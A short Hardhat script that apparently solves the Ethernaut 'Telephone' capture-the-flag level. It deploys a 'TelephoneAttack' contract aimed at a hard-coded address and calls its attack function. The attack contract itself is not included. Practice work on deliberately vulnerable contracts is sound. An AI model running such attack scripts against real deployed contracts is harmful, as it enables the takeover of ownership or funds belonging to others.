
import { ethers } from "hardhat"

async function main() {
  const TelephoneAttack = await ethers.getContractFactory("TelephoneAttack")
  const telephoneAttack = await TelephoneAttack.deploy("0x9bD5908Ee8327cE7A890b9c51808159D8D474D57")

  await telephoneAttack.deployed()

  console.log("Telephone deployed to:", telephoneAttack.address)

  await telephoneAttack.attack()

  console.log("Done!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
